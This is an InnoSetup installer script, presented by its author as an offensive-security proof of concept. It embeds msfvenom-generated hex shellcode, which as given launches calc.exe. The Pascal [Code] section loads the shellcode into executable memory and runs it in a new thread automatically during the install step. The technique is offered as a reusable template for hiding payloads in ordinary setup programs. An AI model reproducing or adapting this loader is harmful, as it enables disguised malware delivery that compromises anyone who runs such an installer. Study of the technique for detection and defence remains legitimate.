; --------------------------------------------------------------------------------------
; PoC Author: Jean-Pierre LESUEUR (@DarkCoderSc)                                       -
; https://www.phrozen.io/                                                              -
; https://www.github.com/darkcodersc                                                   -
; jplesueur@phrozen.io                                                                 -
;                                                                                      -
; Category: Offsec PoC                                                                 -
; Description:                                                                         -
;  Embedd shellcode inside InnoSetup for execution during setup installation.          -
;  The shellcode is executed using InnoSetup Pascal Code Engine through Windows API.   -
;
; REL: July 2021
; --------------------------------------------------------------------------------------

; Configuration
#define SpawnNewProcess 0
#define verbose 1

; msfvenom -p windows/exec -a x86 --platform Windows CMD=calc.exe EXITFUNC=thread -f hex 
#define Payload "fce8820000006089e531c0648b50308b520c8b52148b72280fb74a2631ffac3c617c022c20c1cf0d01c7e2f252578b52108b4a3c8b4c1178e34801d1518b592001d38b4918e33a498b348b01d631ffacc1cf0d01c738e075f6037df83b7d2475e4588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe05f5f5a8b12eb8d5d6a018d85b20000005068318b6f87ffd5bbe01d2a0a68a695bd9dffd53c067c0a80fbe07505bb4713726f6a0053ffd563616c632e65786500"

; BEGIN: Do whatever you want your setup to do.
; Basically, this example is just a basic setup template, in addition of executing a shellcode
; Your setup can do regular setup tasks like installing software.
[Setup]
AppId={{D7EAA450-9906-4D8C-9E74-ED44DF692880}
AppName=InnoShellcode Example
AppVersion=1.5
AppPublisher=DarkCoderSc
AppPublisherURL=https://www.twitter.com/DarkCoderSc
AppSupportURL=https://www.twitter.com/DarkCoderSc
AppUpdatesURL=https://www.twitter.com/DarkCoderSc
CreateAppDir=no
PrivilegesRequired=lowest
OutputBaseFilename=innomal
Compression=lzma
SolidCompression=yes
WizardStyle=modern
Uninstallable=no

[Languages]
Name: "english"; MessagesFile: "compiler:Default.isl"

; END

[Code]

type 
  { Structures }

  TPayloadArray = array of byte;

  { WinAPI Structures }

  TSecurityAttributes = record
     nLength              : DWORD;
     lpSecurityDescriptor : PAnsiChar;
     bInheritHandle       : BOOL;
  end;

  TStartupInfoA = record
    cb              : DWORD;
    lpReserved      : PAnsiChar;
    lpDesktop       : PAnsiChar;
    lpTitle         : PAnsiChar;
    dwX             : DWORD;
    dwY             : DWORD;
    dwXSize         : DWORD;
    dwYSize         : DWORD;
    dwXCountChars   : DWORD;
    dwYCountChars   : DWORD;
    dwFillAttribute : DWORD;
    dwFlags         : DWORD;
    wShowWindow     : Word;
    cbReserved2     : Word;
    lpReserved2     : PAnsiChar;
    hStdInput       : THandle;
    hStdOutput      : THandle;
    hStdError       : THandle;
  end;

  TProcessInformation = record
    hProcess    : THandle;
    hThread     : THandle;
    dwProcessId : DWORD;
    dwThreadId  : DWORD;
  end;

{ WinAPI Definitions }

// Alternatively we can use VirtualAllocEx with current process handle.
function VirtualAlloc(
  lpAddress : PAnsiChar;
  dwSize    : Cardinal;
  flAllocationType,
  flProtect : DWORD
) : Cardinal; external 'VirtualAlloc@kernel32.dll stdcall';

function VirtualAllocEx(
  hProcess  : THandle;
  lpAddress : PAnsiChar;
  dwSize    : Cardinal;
  flAllocationType,
  flProtect : DWORD
) : Cardinal; external 'VirtualAllocEx@kernel32.dll stdcall';

function VirtualFree(
  lpAddress  : Cardinal;
  dwSize     : Cardinal;
  dwFreeType : DWORD
) : BOOL; external 'VirtualFree@kernel32.dll stdcall';

function GetLastError() : DWORD; external 'GetLastError@kernel32.dll stdcall';

function CreateThread(
  lpThreadAttributes : PAnsiChar;
  dwStackSize        : Cardinal;
  lpStartAddress     : Cardinal;
  lpParameter        : PAnsiChar;
  dwCreationFlags    : DWORD;
  var lpThreadId     : DWORD
) : THANDLE; external 'CreateThread@kernel32.dll stdcall';

procedure RtlMoveMemory(
  Dest       : Cardinal;
  Source     : TPayloadArray;
  Len        : Integer
); external 'RtlMoveMemory@kernel32.dll stdcall';

procedure OutputDebugAddress(
  lpAddress : Cardinal
); external 'OutputDebugStringA@kernel32.dll stdcall';

procedure OutputDebugStringA(
  lpOutputString : PAnsiChar
); external 'OutputDebugStringA@kernel32.dll stdcall';

function CryptBinaryToStringA(
  lpAddress         : Cardinal;
  cbBinary, dwFlags : DWORD;
  pszString         : Cardinal;
  var pcchString    : DWORD
) : BOOL; external 'CryptBinaryToStringA@crypt32.dll stdcall';

function CreateProcessA(
  lpApplicationName        : PAnsiChar;
  lpCommandLine            : PAnsiChar;
  var lpProcessAttributes  : TSecurityAttributes;
  var lpThreadAttributes   : TSecurityAttributes;
  bInheritHandles          : BOOL;
  dwCreationFlags          : DWORD;
  lpEnvironment            : PAnsiChar;
  lpCurrentDirectory       : PAnsiChar;
  const lpStartupInfo      : TStartupInfoA;
  var lpProcessInformation : TProcessInformation
) : BOOL; external 'CreateProcessA@kernel32.dll stdcall';

{ WinAPI Constants }

const MEM_COMMIT             = $00001000;
      MEM_RESERVE            = $00002000;
      PAGE_EXECUTE_READWRITE = $00000040; 
      PAGE_READWRITE         = $00000004;    
      CRYPT_STRING_HEX       = $00000004;
      MEM_RELEASE            = $00008000;
      
{ Variables }

var pNil    : PAnsiChar;      // Trick to defined missing "nil/null" instruction on InnoSetup: InnoSetup initialize variable to NULL.
    PAYLOAD : TPayloadArray;  // Our shellcode


{ _.Debug }

procedure Debug(const AMessage : String);
begin
  if {#verbose} = 1 then
    OutputDebugStringA(AMessage);
end;

procedure DebugAddress(const lpAddress : Cardinal);
begin
  if {#verbose} = 1 then
    OutputDebugAddress(lpAddress);
end;

{ _.GetMem }

function GetMem(const ASize : Cardinal; const AExecute : Boolean) : Cardinal;
var AFlags : DWORD;
    ARet   : Cardinal;
begin
  if AExecute then
    AFlags := PAGE_EXECUTE_READWRITE
  else
    AFlags := PAGE_READWRITE;

  ARet := VirtualAlloc(pNil, ASize, MEM_COMMIT or MEM_RESERVE, AFlags);

  if GetLastError() = 0 then
    result := ARet
  else begin
    Debug(Format('Failed to create memory region with last error=[%d].', [GetLastError()])); 

    result := 0;
  end;
end;

{ _.CreateExecutableRemoteMem }

function CreateExecutableRemoteMem(const ASize : Cardinal; const hProcess : THandle) : Cardinal;
var ARet : Cardinal;
begin
  ARet := VirtualAllocEx(
            hProcess,
            pNil,
            ASize,
            MEM_COMMIT or MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
  );

  if GetLastError() = 0 then
    result := ARet
  else begin
    Debug(Format(
            'Failed to create remote memory region (process handle=[%d]) with last error=[%d].', [
              hProcess,
              GetLastError()
            ])
    ); 

    result := 0;
  end;
end;

{ _.FreeMem }

procedure FreeMem(const lpAddress : Cardinal; const ASize : DWORD);
begin
  VirtualFree(lpAddress, ASize, MEM_RELEASE);
end;

{ _.DumpMemory }

procedure DumpMemory(const lpAddress : Cardinal; const ASize : DWORD);
var AMemAddr : Cardinal;
    AReqSize : DWORD;
begin
  CryptBinaryToStringA(lpAddress, ASize, CRYPT_STRING_HEX, 0, AReqSize);

  AMemAddr := GetMem(AReqSize, False);
  try
    CryptBinaryToStringA(lpAddress, ASize, CRYPT_STRING_HEX, AMemAddr, AReqSize);

    DebugAddress(AMemAddr);
  finally
    FreeMem(lpAddress, ASize);
  end;
end;

{ _.InitializePayload }

function InitializePayload() : Boolean;
var I, n        : Integer;
    APayloadStr : String;
    APayloadLen : Cardinal;
    AIndex      : Integer;
begin
  result := False;
  ///

  APayloadStr := '{#Payload}';
  APayloadLen := Length(APayloadStr);

  if APayloadLen mod 2 <> 0 then begin
    Debug('Payload must be aligned to two.');

    Exit;
  end;
  
  Debug(Format('Feed PAYLOAD array (size=[%d]) with hex encoded payload=[%s]', [
                  (APayloadLen div 2),
                  APayloadStr
        ]
  ));

  SetLength(PAYLOAD, (APayloadLen div 2));  

  I := 0;
  while True do begin   
    if I = 0 then
      AIndex := 0
    else
      AIndex := I + 1;

    PAYLOAD[I div 2] := StrToInt('$' + Copy(APayloadStr, AIndex, 2));       
    
    I := I + 2;

    if I = APayloadLen then
      break;
  end; 

  result := True;  
end;     

{ _.ExecLocalShellcode }

procedure ExecLocalShellcode();
var AThreadId     : DWORD;    
    AThreadHandle : THandle;
    AMemAddr      : Cardinal;
begin
  Debug('Create new memory region to host our payload in current process...');  

  AMemAddr := GetMem(Length(PAYLOAD), True);       
  if (AMemAddr = 0) then                                                                           
    Exit;                         

  Debug(
    Format('Memory region successfully created at address=[%x(%d)], size=[%dB].', [
      AMemAddr,
      AMemAddr,
      Length(PAYLOAD)
    ])
   );        

  Debug('Copy our payload to new memory region...');
 
  RtlMoveMemory(AMemAddr, PAYLOAD, Length(PAYLOAD));  
  
  Debug('Payload successfully copied. Dumping memory region content:');
  DumpMemory(AMemAddr, Length(PAYLOAD));
  Debug('---');

  Debug('Execute payload in a separate thread...');

  AThreadHandle := CreateThread(pNil, 0, AMemAddr, pNil, 0, AThreadId);       
  if (AThreadHandle > 0) or (GetLastError <> 0) then
    Debug(Format('Payload successfully executed, ThreadHandle=[%d], ThreadId=[%d].', [AThreadHandle, AThreadId]))
  else
    Debug('Failed to execute payload.');
end;

{ _.CurStepChanged }

procedure CurStepChanged(CurStep: TSetupStep);               
begin
  case CurStep of
      ssInstall : begin          
        Debug('Initialize Payload...');
        if not InitializePayload() then
          Exit;        

        if {#SpawnNewProcess} = 1 then
          sleep(1) // TODO: Stay tuned for external process shellcode execution.
        else
          ExecLocalShellcode();             
      end;
  end;
end;
